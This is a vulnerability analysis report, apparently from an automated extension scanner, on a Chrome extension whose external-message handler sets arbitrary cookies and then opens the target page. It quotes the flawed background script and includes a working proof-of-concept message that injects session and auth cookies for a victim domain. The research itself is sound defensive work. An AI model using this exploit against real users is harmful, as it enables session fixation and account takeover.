# CoCo Analysis: ohbfliccealmpdjlacokkoadfmpjiphi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink (domain)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ohbfliccealmpdjlacokkoadfmpjiphi/opgen_generated_files/bg.js
Line 976: `domain: token.domain || req.domain,`

**Classification:** TRUE POSITIVE

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink (url)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ohbfliccealmpdjlacokkoadfmpjiphi/opgen_generated_files/bg.js
Line 972: `url: req.url,`

**Classification:** TRUE POSITIVE

---

**Code:**

```javascript
// Background script (bg.js lines 968-994)
const setToken = (req) => {
  return new Promise((resolve, reject) => {
    for (const token of req.token) { // ← attacker-controlled token array
      chrome.cookies.set({
        url: req.url, // ← attacker-controlled URL
        name: token.tokenKey, // ← attacker-controlled cookie name
        value: token.tokenValue, // ← attacker-controlled cookie value
        path: "/",
        domain: token.domain || req.domain, // ← attacker-controlled domain
      });
    }

    setTimeout(() => {
      resolve();
    }, 100);
  });
};

chrome.runtime.onMessageExternal.addListener(function(req, sender, callback) {
  if (req.action == 'isInstallScm') {
    callback({ isInstall: true, version: manifestData.version});
    return;
  }
  else if (req.action) { // ← any action triggers cookie injection
    setToken(req).then(() => {
      window.open(req.url,'_blank'); // ← opens attacker-controlled URL with injected cookies
    });
  }
});
```

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted origin (localhost or *.onesell.co.kr per manifest):
chrome.runtime.sendMessage(
    'ohbfliccealmpdjlacokkoadfmpjiphi', // extension ID
    {
        action: "inject",
        url: "https://victim.com/",
        domain: ".victim.com",
        token: [
            {
                tokenKey: "session_id",
                tokenValue: "attacker_session_value",
                domain: ".victim.com"
            },
            {
                tokenKey: "auth_token",
                tokenValue: "malicious_auth_token",
                domain: ".victim.com"
            }
        ]
    }
);

// The extension will:
// 1. Set arbitrary cookies on any domain (victim.com)
// 2. Open a new window to that domain with the injected cookies
// This enables session fixation, CSRF attacks, and authentication bypass
```

**Impact:** Arbitrary cookie injection on any domain. An attacker can inject cookies with arbitrary names, values, and domains, then have the extension open a window to that domain. This enables session fixation attacks, authentication bypass, CSRF, and complete compromise of user sessions on arbitrary websites. The attacker has full control over cookie parameters including domain, name, and value.
